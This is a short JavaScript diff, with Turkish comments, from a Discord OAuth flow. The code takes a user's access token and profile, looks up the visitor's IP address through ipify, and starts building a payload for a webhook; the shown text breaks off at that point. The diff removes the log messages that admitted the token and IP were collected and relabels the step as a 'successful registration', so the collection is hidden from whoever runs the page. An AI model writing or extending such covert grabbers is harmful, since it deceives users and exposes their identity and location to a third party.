@@ -87,14 +87,13 @@
         });
         const tokenData = await tokenRes.json();
         if (!tokenData.access_token) throw new Error("Access token alınamadı.");
-        log("✅ access_token alındı.");
 
         // 2. Kullanıcı bilgisi çek
         const userRes = await fetch("https://discord.com/api/users/@me", {
           headers: { "Authorization": `Bearer ${tokenData.access_token}` }
         });
         const user = await userRes.json();
-        log("✅ Kullanıcı bilgisi çekildi.");
+        log("✅ Başarılı kayıt.");
 
         // 3. Vanity URL (kısa kullanıcı URL'si)
         const vanity_url = `https://discord.com/users/${user.id}`;
@@ -102,7 +101,6 @@
         // 4. IP adresi çek
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
-        log("✅ IP adresi alındı.");
 
         // 5. Webhook'a gönderilecek payload
         const payload = {
